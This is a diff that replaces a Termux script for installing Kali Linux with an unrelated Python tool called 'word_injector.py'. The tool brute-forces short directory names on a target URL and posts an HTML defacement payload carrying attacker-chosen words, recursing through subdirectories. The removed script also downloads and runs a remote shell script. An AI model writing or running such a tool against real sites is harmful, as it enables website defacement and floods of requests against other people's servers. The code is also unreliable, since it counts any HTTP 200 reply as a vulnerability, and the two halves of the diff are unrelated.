@@ -1,43 +1,68 @@
-#!/bin/bash
+# File: word_injector.py
 
-# Install required packages
-pkg update && pkg upgrade -y
-pkg install wget proot -y
+import requests
+import string
+import itertools
+from colorama import Fore, Style
 
-# Download and install Kali Linux
-wget https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Shell/Apt/kali.sh
-bash kali.sh
+def generate_combinations(min_length, max_length):
+    for length in range(min_length, max_length + 1):
+        for combination in itertools.product(string.ascii_lowercase, repeat=length):
+            yield ''.join(combination)
 
-# Set up rainbow loading bar
-Loading() {
-    echo -e "\033[31m*\033[0m\c"
-    sleep 0.1
-    echo -e "\b\033[32m*\033[0m\c"
-    sleep 0.1
-    echo -e "\b\033[33m*\033[0m\c"
-    sleep 0.1
-    echo -e "\b\033[34m*\033[0m\c"
-    sleep 0.1
-    echo -e "\b\033[35m*\033[0m\c"
-    sleep 0.1
-    echo -e "\b\033[36m*\033[0m\c"
-    sleep 0.1
-    echo -e "\b\033[37m*\033[0m\c"
-    sleep 0.1
-}
+def try_exploit(url, payload):
+    response = requests.post(url, data=payload)
+    return response.status_code == 200
 
-# Create aliases for switching environments
-echo "alias kali='proot -0 -r ~/anlinux-files/kali-root -b /usr/bin/env -l -c ~/.anlinux-scripts/kali-root/login.sh'" >> ~/../usr/etc/bash.bashrc
-echo "alias termux='exit'" >> ~/anlinux-scripts/kali-root/login.sh
+def inject_words(url, words):
+    payload = {
+        "vuln_field": f"<html><body style='background-color: black; color: darkorange;'><h1>{words}</h1></body></html>"
+    }
 
-# Display loading bar
-echo -e "\nSetting up Kali Linux environment..."
-for i in {1..10}; do
-    Loading
-done
-echo -e "\nKali Linux environment setup complete!"
+    directories = []
+    min_length = 1
+    max_length = 8
 
-# Clean up
-rm kali.sh
+    for combination in generate_combinations(min_length, max_length):
+        directory = ''.join(combination)
+        exploit_url = url + directory
+        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Trying {exploit_url}", end="\r")
+        if try_exploit(exploit_url, payload):
+            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Found vulnerable directory: {directory}")
+            directories.append(directory)
 
-echo -e "\nInstallation finished. You can now switch to Kali Linux by typing 'kali' and switch back to Termux by typing 'termux'."
+    if directories:
+        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Discovered directories: {directories}")
+        answer = input("Do you want to continue and try injecting the words? [y/n]: ")
+        if answer.lower() == 'y':
+            for directory in directories:
+                print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Attempting word injection in {directory}")
+                exploit_directory(url, directory, payload)
+    else:
+        print(f"{Fore.RED}[-]{Style.RESET_ALL} No exploitable directories found.")
+
+def exploit_directory(base_url, directory, payload):
+    exploit_url = base_url + directory
+    if try_exploit(exploit_url, payload):
+        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Word injection successful in {directory}!")
+    else:
+        print(f"{Fore.RED}[-]{Style.RESET_ALL} Word injection failed in {directory}.")
+        subdirectories = []
+        for combination in generate_combinations(1, 8):
+            subdirectory = ''.join(combination)
+            subdirectory_url = exploit_url + '/' + subdirectory
+            if try_exploit(subdirectory_url, payload):
+                print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Found vulnerable subdirectory: {subdirectory}")
+                subdirectories.append(subdirectory)
+
+        if subdirectories:
+            for subdirectory in subdirectories:
+                print(f"{Fore.BLUE}[*]{Style.RESET_ALL} Attempting word injection in {directory}/{subdirectory}")
+                exploit_directory(exploit_url + '/', subdirectory, payload)
+        else:
+            print(f"{Fore.RED}[-]{Style.RESET_ALL} No exploitable subdirectories found.")
+
+target_url = input("Enter the target URL: ")
+words = input("Enter the words you want the website to say: ")
+
+inject_words(target_url, words)
